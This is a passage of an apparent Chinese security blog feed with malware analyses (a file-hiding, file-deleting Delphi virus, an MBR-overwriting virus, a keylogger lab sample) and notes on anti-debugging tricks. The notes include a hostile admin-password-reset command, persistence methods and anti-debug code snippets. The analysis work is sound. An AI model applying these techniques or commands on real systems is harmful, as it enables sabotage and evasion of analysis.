    <content type="html"><![CDATA[<h1 id="一：目录"><a href="#一：目录" class="headerlink" title="一：目录"></a>一：目录</h1><ul><li>1.样本信息</li><li>2.行为分析</li><li>3.样本分析<a id="more"></a><h1 id="二：样本分析"><a href="#二：样本分析" class="headerlink" title="二：样本分析"></a>二：样本分析</h1><h2 id="母体文件"><a href="#母体文件" class="headerlink" title="母体文件"></a>母体文件</h2></li><li>1.病毒名称：Gho.exe（<a href="https://www.52pojie.cn/thread-624323-1-1.html）" target="_blank" rel="external">https://www.52pojie.cn/thread-624323-1-1.html）</a></li><li>2.md5:94861ecbc2fd8043fa5bd69d004cfe59</li><li>3.编写语言：delphi</li><li>4.是否加壳：无壳<h2 id="子体文件"><a href="#子体文件" class="headerlink" title="子体文件"></a>子体文件</h2></li><li>1.文件名：自定义</li><li>2.是否加壳：无壳</li><li>3.编写语言：VB<h1 id="三：行为分析"><a href="#三：行为分析" class="headerlink" title="三：行为分析"></a>三：行为分析</h1><h2 id="1：母体文件分析"><a href="#1：母体文件分析" class="headerlink" title="1：母体文件分析"></a>1：母体文件分析</h2></li><li>1.程序先重新设置了计时器，程序首先遍历存在驱动器下的所有文件，把文件设置成隐藏属性，将本体文件图标设置为文件夹类型（实际是exe文件），如果用户打开，则通过复制文件的方式，打开一个目录，实际上程序已经在后台执行了。</li><li>2.遍历A-Z盘，然后获取本地时间，如果在2009年，3月以后的每个月的1,10，15,29号进行删除文件操作</li><li>3.通过设置注册表Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced实现本体文件的隐藏</li><li>4.设置时间，加载资源文件，然后将加载出来的文件映射如内存，最后执行该文件C:\windows\nasm.exe</li><li>5.先判断本体进程是否为javasc.exe，如果是的话，复制文件到c:\windows\sdafdf.exe，然后执行目的是为了隐藏本体文件。</li><li>6.判断进程名称是否是javasc.exe，如果是就到7，否则就到8.</li><li>7.复制本体文件到c:\windows\sdafdf.exe，然后执行，此举是为了隐藏文件</li><li>8.判断与该路径下是否有实体存在，如果有，进行9，如果没有进行10</li><li>9.获取文件目录，文件名称，链接后执行</li><li>10.获取指定目录下的文件C:\windows\avb.exe，如果文件存在，则进行11，否则进行12</li><li>11.复制文件C:\windows\system32\javasc.exe后，创建一个服务来实现自启动。</li><li>12。复制文件C:\windows\system32\javasc.exe后，创建服务实现自启动，在其复制文件，在注册表’SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce下创建键值，实现自启动，这样做为了确保程序能够启动。</li><li>13.比较C:\windows\avb.exe是否存在，如果存在进行14，否则进行15</li><li>14.比较是否是C：\windows\mscb.exe，如果不是，则正常退出。</li><li>15。复制文件到C:\windows\mscb.exe，然后执行后<h2 id="2-子体文件分析"><a href="#2-子体文件分析" class="headerlink" title="2.子体文件分析"></a>2.子体文件分析</h2></li><li>1.程序先对进程列表拍摄拍照，调用Process32First和Proecss32Next查找进程</li><li>2.然后在402EB0调用403E60，把目标文件分成mydat1和mydat两个部分。</li><li>3.调用shutdown强制10s关机<h1 id="四：详细分析"><a href="#四：详细分析" class="headerlink" title="四：详细分析"></a>四：详细分析</h1></li><li>0.查壳，利用deplhi_decompiler查看，发现5个事件（4个Timer和一个Form）。<br>  <img src="https://i.imgur.com/CTqOg7g.png" alt=""><h2 id="Timer1"><a href="#Timer1" class="headerlink" title="Timer1"></a>Timer1</h2></li><li>1.在第一个Timer中，程序重新设置计时器<br>  <img src="https://i.imgur.com/jMCLw6c.png" alt=""></li><li>2.然后先初始化bl寄存器为67（’C’），然后调用GetDriverTypeA获取磁盘驱动器，保存驱动器序号，接着和’]’比较,这样一来就遍历了整个磁盘。<br>  <img src="https://i.imgur.com/XcNa7yt.png" alt=""><br>  <img src="https://i.imgur.com/WN2SVek.png" alt=""><br>  <img src="https://i.imgur.com/uPkOnp0.png" alt=""></li><li>3.在CopyFileFun中，调用FindFirst和FidNext来遍历整个文件系统，然后CopyFile中设置文件属性为隐藏<br>  <img src="https://i.imgur.com/yqEx4x1.png" alt=""><br>  <img src="https://i.imgur.com/iVWw7KT.png" alt=""><h2 id="Timer2"><a href="#Timer2" class="headerlink" title="Timer2"></a>Timer2</h2></li><li>1.程序先获取本地计算机的驱动器，然后获取本地时间，接着喝2009,3,1，21,29比较，在2009年3月以后的每个月的1号，10号，21号，29号，然后调用FindFileAndDel（自定义）删除文件。<br>  <img src="https://i.imgur.com/uOTDA36.png" alt=""><br>  <img src="https://i.imgur.com/zioIgFz.png" alt=""><br>  <img src="https://i.imgur.com/nLF26Xj.png" alt=""><h2 id="Form"><a href="#Form" class="headerlink" title="Form"></a>Form</h2></li><li>1.病毒首先比较当前进程是否等于javasc.exe，如果是该进程的话，复制文件到c:\windows\sdafdf.exe，然后执行程序。<br>  <img src="https://i.imgur.com/nlgdfub.png" alt=""></li><li>2.否则就判断进程路径中是否存在文件，如果存在文件，就获取路径和文件名然后连接两个字符串，接着执行.<br>  <img src="https://i.imgur.com/kCkxWUQ.png" alt=""></li><li>3.判断C:\windows\avb.exe’文件是否存在，如果存在，调用 SetReg_HideFun设置文件隐藏，然后复制文件到C:\windows\system32\javasc.exe，并且创建一个服务，以实现自启动。再次复制文件，然后向注册表中SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce写入路径，已达到自启动作用<br>  <img src="https://i.imgur.com/3U7aKv9.png" alt=""><br>  <img src="https://i.imgur.com/B8rdBCB.png" alt=""></li><li>4.如果C:\windows\avb.exe不存在，复制一份到C:\windows\avb.exe，然后，在复制一份到C:\windows\system32\javasc.exe，然后和3一样</li><li>5.比较本体进程是否是C:\windows\avb.exe，如果不是，则正常退出。</li><li>6.如果是C:\windows\avb.exe，则复制到C:\windows\mscb.exe，然后执行<br>  <img src="https://i.imgur.com/2xFOdmQ.png" alt=""><h2 id="Timer3"><a href="#Timer3" class="headerlink" title="Timer3"></a>Timer3</h2></li><li>1.重新设置计时器，然后调用了SetReg_HideFun函数<br>   <img src="https://i.imgur.com/ZD861Qy.png" alt=""><br>   <img src="https://i.imgur.com/b24DTSI.png" alt=""><h2 id="Timer4"><a href="#Timer4" class="headerlink" title="Timer4"></a>Timer4</h2></li><li>1.在EXEFILE资源文件中加载exe文件<br>  <img src="https://i.imgur.com/SsfAgXb.png" alt=""><br>  <img src="https://i.imgur.com/upviiw6.png" alt=""><br>  <img src="https://i.imgur.com/VupnP3g.png" alt=""></li><li>2.写入C:\windows\nasm.exe后，把它映射如内存<br>  <img src="https://i.imgur.com/BJvFQPU.png" alt=""></li><li>3.执行文件<h2 id="子程序分析"><a href="#子程序分析" class="headerlink" title="子程序分析"></a>子程序分析</h2></li><li>1.查壳：VB</li><li>2.程序先对进程列表拍摄拍照，调用Process32First和Proecss32Next查找进程<br>  <img src="https://i.imgur.com/xRGrCX5.png" alt=""></li><li>3.然后在402EB0调用403E60，把目标文件分成mydat1和mydat两个部分。<br>  <img src="https://i.imgur.com/q6WNkcV.png" alt=""></li><li>4.调用shutdown强制10s关机，<br>  <img src="https://i.imgur.com/vbzZi50.png" alt=""><br><a href="https://pan.baidu.com/s/1C8yHVcdMqjYYIvOIDedxag" target="_blank" rel="external">https://pan.baidu.com/s/1C8yHVcdMqjYYIvOIDedxag</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一：目录&quot;&gt;&lt;a href=&quot;#一：目录&quot; class=&quot;headerlink&quot; title=&quot;一：目录&quot;&gt;&lt;/a&gt;一：目录&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;1.样本信息&lt;/li&gt;
&lt;li&gt;2.行为分析&lt;/li&gt;
&lt;li&gt;3.样本分析
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>病毒分析技术(3)---小型硬盘加密病毒</title>
    <link href="http://yoursite.com/2018/03/05/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF(3)/"/>
    <id>http://yoursite.com/2018/03/05/病毒分析技术(3)/</id>
    <published>2018-03-05T08:45:11.000Z</published>
    <updated>2018-03-05T11:55:30.838Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一：目录"><a href="#一：目录" class="headerlink" title="一：目录"></a>一：目录</h1><ul><li>1.样本信息</li><li>2.行为分析</li><li>3.样本分析<a id="more"></a><h1 id="二：样本信息"><a href="#二：样本信息" class="headerlink" title="二：样本信息"></a>二：样本信息</h1></li><li>1.样本名称：病毒.exe(来自52pojie)</li><li>2.md5:e7e125ca74aef69d3ffc423ce3aa97d7</li><li>3.加壳：无壳</li><li>4.编写语言：Microsoft Visual C++ ver 5.0/6.0<h1 id="三：行为分析"><a href="#三：行为分析" class="headerlink" title="三：行为分析"></a>三：行为分析</h1></li><li>1.将病毒文件复制到系统目录，实现隐藏，但是程序未删除本体。</li><li>2.在注册表Software\Microsoft\Windows\CurrentVersion\Run，传入数据，实现自启动。</li><li>3.利用time（）和rand（）做随机数，显示数据为rand()+0C1Eh,加密数据为rand()+0C1E+D4h,然后分别利用itoa()来转化为对应的ACSII码。<br>  <img src="https://i.imgur.com/LA6bg85.png" alt=""></li><li>4.调用system()来执行net user administrator 123，修改管理员账户密码为123.</li><li>5.调用sub_401000（）read硬盘主引导扇区文件。如图，算的结果是0，说明读取的文件为0柱面0磁头1扇区。<br>  <img src="https://i.imgur.com/OBmqzLC.png" alt=""></li><li>6.调用sub_401480来向0柱面0磁头3扇区写入刚刚所读取的信息，如图计算的结果是十进制的1024也就是16进制的400H，也就是0柱面0磁头3扇区所在地。<br>  <img src="https://i.imgur.com/KUM6f4W.png" alt=""><br>  <img src="https://i.imgur.com/35BHOXp.png" alt=""></li><li>7.调用sub_401480来想0柱面0磁头1扇区写入生成的密码</li><li>8.调用system执行shutdown -r。重启计算机。<h1 id="四：值得商榷的地方"><a href="#四：值得商榷的地方" class="headerlink" title="四：值得商榷的地方"></a>四：值得商榷的地方</h1></li><li>1.在第二个sub_401480处引用了一个硬编码作为传入的参数写入MBR，但是原作者给出的是参考书+212的结论。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一：目录&quot;&gt;&lt;a href=&quot;#一：目录&quot; class=&quot;headerlink&quot; title=&quot;一：目录&quot;&gt;&lt;/a&gt;一：目录&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;1.样本信息&lt;/li&gt;
&lt;li&gt;2.行为分析&lt;/li&gt;
&lt;li&gt;3.样本分析
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>病毒分析技术(2)</title>
    <link href="http://yoursite.com/2018/03/02/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF(2)/"/>
    <id>http://yoursite.com/2018/03/02/病毒分析技术(2)/</id>
    <published>2018-03-02T08:45:11.000Z</published>
    <updated>2018-03-02T13:55:37.772Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一：目录"><a href="#一：目录" class="headerlink" title="一：目录"></a>一：目录</h1><ul><li>1.样本信息</li><li>2.行为分析</li><li>3.样本分析<h1 id="二：样本信息"><a href="#二：样本信息" class="headerlink" title="二：样本信息"></a>二：样本信息</h1></li><li>1.样本名称：Lab17-3【来自恶意代码实战分析】</li><li>1.md5：7a2e485d1bea00ee5907e4cc02cb2552</li><li>3.壳：无壳</li><li>4.编写语言：Viusal C++ ver 5.0/6.0<a id="more"></a><h1 id="三：行为分析"><a href="#三：行为分析" class="headerlink" title="三：行为分析"></a>三：行为分析</h1></li><li>1.程序利用x86漏洞检测是否处于虚拟机下</li><li>2.检查进程是否有vmware</li><li>3.检查网络适配器mac是否有vmware公司特有的mac前三个值。</li><li>4.释放资源文件，释放入进程空间，并解密，形成PE文件</li><li>5.进行进程替换技术，实现恶意代码隐藏</li><li>6.释放的代码先创建文件，然后记录用户按键信息，并存储。<h1 id="四：分析过程"><a href="#四：分析过程" class="headerlink" title="四：分析过程"></a>四：分析过程</h1></li><li>1.经过PEID查壳，没有加壳，是VC编译而成。<br>   <img src="https://i.imgur.com/QLRKDHc.png" alt=""></li><li>2.IDA查看汇编代码，首先在40199A处调用函数，经过条件跳转发现有一个分支可能会导致程序退出，进入该函数查看。<br>  <img src="https://i.imgur.com/a7uENr1.png" alt=""></li><li>3.发现一个in指令，前面有特殊的字符串（VM，VMXH），这个是利用虚拟化x86漏洞进行的反虚拟机技术。分析流程必须让程序跳转，才能避开这个反虚拟机技术。为此，我们将jz这个跳转打补丁为jmp。<br>  <img src="https://i.imgur.com/zoBp9Fj.png" alt=""></li><li>4.在此处，程序将一个注册表值传入函数，这个注册表存储的是关于驱动设备的信息。<br>  <img src="https://i.imgur.com/iwPcwtE.png" alt=""><br>  <img src="https://i.imgur.com/VOfpGTa.png" alt=""></li><li>5.我们跟进去看看，函数首先利用RegQueryInfoKey遍历这个注册表寻找上述的注册表路径，然后调调用RegEnumKeyEx函数打开该注册表下的每个子项。将特征值vmware传入函数 sub_4010B0，用来寻找是否存在vmware字符串的子项的值。<br>   <img src="https://i.imgur.com/gC40ZZ7.png" alt=""><br>   <img src="https://i.imgur.com/2Vo32Og.png" alt=""></li><li>6.我们跟入 sub_4010B0查看，发现和我们猜测一致，程序将注册表值前5个字符串和vmware比较。<br>   <img src="https://i.imgur.com/xxegQHU.png" alt=""></li><li>7.发现条用GetProcAddress函数获取函数地址，在该处做交叉引用，发现两处调用信息，都是在函数401670处，<br>   <img src="https://i.imgur.com/J9DhIUF.png" alt=""><br>   <img src="https://i.imgur.com/ULbdKuz.png" alt=""></li><li>8.在401670内部，查看msdn，这个函数是获取网络适配器信息的函数，关键的一点是函数有个参数是指向缓冲区的指令，这个缓冲区用来接收获取的适配器信息。(1)初始化数组，用于后续的比较。(2)第一次调用是用来接收缓冲区大小的，以便分配缓冲区空间，(3)第二次调用是为了获取网络适配器信息。先将已知的数据结构格式化，插入IP_ADAPTER_INFO得到格式化后的信息，发现函数先用type和6H及71H比较，查看msdn知道，这两个值分别是无限适配器和以太网络适配器。然后用他和前面的初始化的数组比较进行每三个一次的比较。(4)当一个数据比较完成后，程序跳转到Loc_4017D7进行下组数据的比较，(5)当这一轮所有数据比较完成后，跳转到loc_401797处进行下个适配器的比较。(6)最最关键的比较的数组是什么？？里面的数据是vm所用的特征MAC地址。(7)在避过反虚拟机技术后，函数加载资源文件，(8)然后调用401340对刚刚加载到内存的资源文件进行异或41H解密。<br>   <img src="https://i.imgur.com/GKaFIl6.png" alt=""><br>   <img src="https://i.imgur.com/elijGnW.png" alt=""><br>   <img src="https://i.imgur.com/uJOQI0B.png" alt=""><br>   <img src="https://i.imgur.com/SpQTfAt.png" alt=""><br>   <img src="https://i.imgur.com/iZDDbkL.png" alt=""><br>   <img src="https://i.imgur.com/bHWzRPA.png" alt=""><br>   <img src="https://i.imgur.com/a73b77l.png" alt=""><br>   <img src="https://i.imgur.com/a7EzfjC.png" alt=""><br>   <img src="https://i.imgur.com/QkQmCHW.png" alt=""><br>   <img src="https://i.imgur.com/Kb3D4jx.png" alt=""><br>   <img src="https://i.imgur.com/Ku7xeEJ.png" alt=""></li><li>9.进入401670，发现这个函数先获取了系统目录，在链接传入的参数svchost，目的是为了隐藏宿主文件。<br>  <img src="https://i.imgur.com/rfIAJgj.png" alt=""></li><li>10.进入401400函数内部，首先函数调用了 sub_401130，跟进去，发现函数显示拍摄了进程的快照，然后调用了Process32First和Process32Next，进行遍历指定的进程。计算Hash值与vmware的哈希值是否相等，相等就是存在vmware这个进程。然后使用进程替换技术，实现恶意代码（资源文件）的隐藏.<br>  <img src="https://i.imgur.com/UhLdjEt.png" alt=""><br>  <img src="https://i.imgur.com/CqMlQ8C.png" alt=""><br>  <img src="https://i.imgur.com/L1emxTW.png" alt=""></li><li>11.程序在401412处引发的非法地址访问异常不知道是为了什么？nop掉<br>  <img src="https://i.imgur.com/t7fT1Sx.png" alt=""></li><li>12.我们利用工具来获取加载的文件，利用winhex修改字节，因为数据异或加密41h<br>  <img src="https://i.imgur.com/xbAGCFF.png" alt=""></li><li>13.对资源文件反汇编，发现这个程序过程很简单，第一寻找一个窗口，然后设置一个键盘的钩子。通过对钩子函数的第二个参数反汇编，发现程序先创建一个文件，然后在我们的按键信息在哪个日志文件中存储。<br>  <img src="https://i.imgur.com/kFOf09g.png" alt=""><br>  <img src="https://i.imgur.com/Fu2tToy.png" alt=""><br>  <img src="https://i.imgur.com/Y4T2aNt.png" alt=""></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一：目录&quot;&gt;&lt;a href=&quot;#一：目录&quot; class=&quot;headerlink&quot; title=&quot;一：目录&quot;&gt;&lt;/a&gt;一：目录&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;1.样本信息&lt;/li&gt;
&lt;li&gt;2.行为分析&lt;/li&gt;
&lt;li&gt;3.样本分析&lt;h1 id=&quot;二：样本信息&quot;&gt;&lt;a href=&quot;#二：样本信息&quot; class=&quot;headerlink&quot; title=&quot;二：样本信息&quot;&gt;&lt;/a&gt;二：样本信息&lt;/h1&gt;&lt;/li&gt;
&lt;li&gt;1.样本名称：Lab17-3【来自恶意代码实战分析】&lt;/li&gt;
&lt;li&gt;1.md5：7a2e485d1bea00ee5907e4cc02cb2552&lt;/li&gt;
&lt;li&gt;3.壳：无壳&lt;/li&gt;
&lt;li&gt;4.编写语言：Viusal C++ ver 5.0/6.0
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>反调试技术【读书笔记】</title>
    <link href="http://yoursite.com/2018/02/19/%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"/>
    <id>http://yoursite.com/2018/02/19/反调试技术/</id>
    <published>2018-02-19T06:00:11.000Z</published>
    <updated>2018-02-24T13:43:31.886Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-反调试技术："><a href="#1-反调试技术：" class="headerlink" title="1.反调试技术："></a>1.反调试技术：</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;恶意代码编写者利用反调试技术来判断恶意代码是否被调试，以此来阻止调试器分析，或者使调试器失效。<strong>注意，也可以使用反调试来保护我们的加密代码，不一定是干扰或者破坏调试器，</strong><br>参考资料：<br>1.逆向工程核心原理<br>2.恶意代码分析实战<br><a id="more"></a></p><h1 id="2-检测调试器"><a href="#2-检测调试器" class="headerlink" title="2.检测调试器"></a>2.检测调试器</h1><h2 id="2-1：利用windows数据结构"><a href="#2-1：利用windows数据结构" class="headerlink" title="2-1：利用windows数据结构"></a>2-1：利用windows数据结构</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PEB结构包含关于进程的诸多信息，其中也包含调试信息。关于进程是否处于调试状态与以下几个成员有关。<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">+<span class="number">0x02</span>  <span class="keyword">BeingDebugged </span>      <span class="comment">;Uchar</span></div><div class="line">+<span class="number">0x0c</span>  Ldr                 <span class="comment">;PEB_LDR_DATA</span></div><div class="line">+<span class="number">0x18</span>  ProcessHeap         <span class="comment">;Void</span></div><div class="line">+<span class="number">0x68</span>  NtGlobalFlag        <span class="comment">;uint48</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如何过去PEB的结构呢？FS寄存器指向的是PEB结构，PEB.ProcessEvnivornmentBlock(+0x30)指向的是PEB的结构体。由此可以来访问PEB结构了。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">fs</span>:[<span class="number">30h</span>]</div><div class="line">或者：</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">fs</span>:[<span class="number">18h</span>]          <span class="comment">;获取TEB的地址</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,[<span class="built_in">eax</span>+<span class="number">30h</span>]         <span class="comment">;获取PEB的地址</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于BeingDebugged是利用这个成员是否为0来判断进程是否处于调试状态。Ldr成员指向的PEB_LDR_DATA数据区域，如果进程处于调试状态，这个区域填充着特殊字符（0xfeeeeeee）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ProcessHeap[4]是一个数组，关于反调试的是Flag(0xC或者0x40)和ForseFlag(0x10或者0x44)这两个成员。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;调试中的进程和正常运行的进程时不同的，凭借NtGlobalFlag这个未公开的成员可以判断进程是否处于调试状态，<strong>如果该成员的值是0x70得话，那么这个进程处于调试状态。</strong></p><h2 id="2-2：windowsAPI"><a href="#2-2：windowsAPI" class="headerlink" title="2-2：windowsAPI"></a>2-2：windowsAPI</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一下这两个函数是检测IsDebugged这个成员的。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">IsDebuggedPresent</span><span class="params">()</span></span></div><div class="line"><span class="function"><span class="title">CheckRemoteDebuggedPresent</span><span class="params">()</span></span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用NtQueryInformationProcess（)来进行反调试。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">NTSTATUS WINAPI NtQueryInformationProcess（</div><div class="line">  <span class="variable">_In_</span> HANDLE ProcessHandle，</div><div class="line">  <span class="variable">_In_</span> PROCESSINFOCLASS ProcessInformationClass，</div><div class="line">  <span class="variable">_Out_</span> PVOID ProcessInformation，</div><div class="line">  <span class="variable">_In_</span> ULONG ProcessInformationLength，</div><div class="line">  <span class="variable">_Out_opt_</span> PULONG ReturnLength</div><div class="line">）;</div></pre></td></tr></table></figure></p><ul><li><strong>如果第二个参数是ProcessDebugPort的话，通过检查该参数返回的值来判断进程是否被调试，如果返回0，说明没有被调试，否是说明进程正在被调试。</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OutPutDebugString（）函数用于返回调试信息，如果进程没有被调试，如果调用此函数，该函数会返回失败。利用如下代码<figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">SetLastError</span>(<span class="number">1234</span>)；</div><div class="line"><span class="selector-tag">OutPutDebugString</span>(<span class="string">"Test for Debug"</span>)；<span class="comment">//如果该函数调用成功，不返回错误代码，说明处于被调试</span></div><div class="line"><span class="selector-tag">if</span>(GetLastError()==<span class="number">1234</span>)   <span class="comment">//错误代码没有被更改，说明函数调用正常</span></div><div class="line"><span class="selector-tag">ExitProcess</span>();</div><div class="line"><span class="selector-tag">else</span></div><div class="line">    <span class="selector-tag">RunProcess</span>();</div></pre></td></tr></table></figure></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用NtQuerySystemInformation（）来判断系统是否处于调试状态。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">NTSTATUS WINAPI NtQuerySystemInformation（</div><div class="line">  <span class="variable">_In_</span> SYSTEM_INFORMATION_CLASS SystemInformationClass，</div><div class="line">  <span class="variable">_Inout_</span> PVOID SystemInformation，</div><div class="line">  <span class="variable">_In_</span> ULONG SystemInformationLength，</div><div class="line">  <span class="variable">_Out_opt_</span> PULONG ReturnLength</div><div class="line">）;</div></pre></td></tr></table></figure></p><ul><li><p><strong>如果进程处于调试状态，在第一个参数传入SystemKernelDebuggerInformation(0x23)后，返回第二个参数指向的system_kernel_Debug_Information的结构中的Debugedable设置为1.</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用NtQueryObject来判断，当某个调试器在调试进程的时候，系统会创建一个内核调试对象，通过检查内核信息链表来查找是否存在内核调试对象。</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">NTSTATUS NtQueryObject（</div><div class="line">  _In_opt_手柄手柄，</div><div class="line">  _In_ OBJECT_INFORMATION_CLASS ObjectInformationClass，</div><div class="line">  _Out_opt_ PVOID ObjectInformation，</div><div class="line">  _In_ ULONG ObjectInformationLength，</div><div class="line">  _Out_opt_ PULONG ReturnLength</div><div class="line">）;</div><div class="line">typedef <span class="class"><span class="keyword">enum</span> <span class="title">_OBJECT_INFORMATION_CLASS</span> //未公开</span></div><div class="line">&#123; </div><div class="line"> ObjectBasicInformation，</div><div class="line"> ObjectNameInformation，</div><div class="line"> ObjectTypeInformation，</div><div class="line"> ObjectTypesInformation，</div><div class="line"> ObjectHandleFlagInformation </div><div class="line">&#125; OBJECT_INFORMATION_CLASS;</div></pre></td></tr></table></figure></li><li><p><strong>在第二个参数传递ObjectBasicInformation共枚举类型中的ObjectAllTypesInformation(3号)，通过返回在第三个参数中的指针对应的ObjectInformation来查找是否存在调试内核对象。</strong></p></li><li><p>破解：修改传入参数为ObjectBasicInformtion（0号）来避免反调试<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用ZwSetInformationThread（）来隐藏被调试进程以达到反调试的效果。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">NTSTATUS ZwSetInformationThread(</div><div class="line">  _In_ HANDLE          ThreadHandle,</div><div class="line">  _In_ THREADINFOCLASS ThreadInformationClass,</div><div class="line">  _In_ PVOID           ThreadInformation,</div><div class="line">  _In_ ULONG           ThreadInformationLength</div><div class="line">)<span class="comment">;</span></div><div class="line">//ntpsapi.h</div><div class="line">typedef enum _THREADINFOCLASS &#123;</div><div class="line"><span class="built_in">    ThreadBasicInformation,</span></div><div class="line"><span class="built_in">    ThreadTimes,</span></div><div class="line"><span class="built_in">    ThreadPriority,</span></div><div class="line"><span class="built_in">    ThreadBasePriority,</span></div><div class="line"><span class="built_in">    ThreadAffinityMask,</span></div><div class="line"><span class="built_in">    ThreadImpersonationToken,</span></div><div class="line"><span class="built_in">    ThreadDescriptorTableEntry,</span></div><div class="line"><span class="built_in">    ThreadEnableAlignmentFaultFixup,</span></div><div class="line"><span class="built_in">    ThreadEventPair_Reusable,</span></div><div class="line"><span class="built_in">    ThreadQuerySetWin32StartAddress,</span></div><div class="line"><span class="built_in">    ThreadZeroTlsCell,</span></div><div class="line"><span class="built_in">    ThreadPerformanceCount,</span></div><div class="line"><span class="built_in">    ThreadAmILastThread,</span></div><div class="line"><span class="built_in">    ThreadIdealProcessor,</span></div><div class="line"><span class="built_in">    ThreadPriorityBoost,</span></div><div class="line"><span class="built_in">    ThreadSetTlsArrayAddress,</span></div><div class="line"><span class="built_in">    ThreadIsIoPending,</span></div><div class="line"><span class="built_in">    ThreadHideFromDebugger,</span>//这个就是用来将线程对调试器隐藏</div><div class="line"><span class="built_in">    ThreadBreakOnTermination,</span></div><div class="line"><span class="built_in">    ThreadSwitchLegacyState,</span></div><div class="line"><span class="built_in">    ThreadIsTerminated,</span></div><div class="line">    MaxThreadInfoClass</div><div class="line">    &#125; THREADINFOCLASS<span class="comment">;</span></div><div class="line">// end_ntddk end_ntifs</div></pre></td></tr></table></figure></li><li><p>在第二个参数传入ThreadHideFromDebugger,如果进程处于调试状态，该API函数会使调试器和进程终止.</p></li><li>应对方法：修改传入参数，为0即可。</li></ul><h2 id="2-3：检测系统痕迹"><a href="#2-3：检测系统痕迹" class="headerlink" 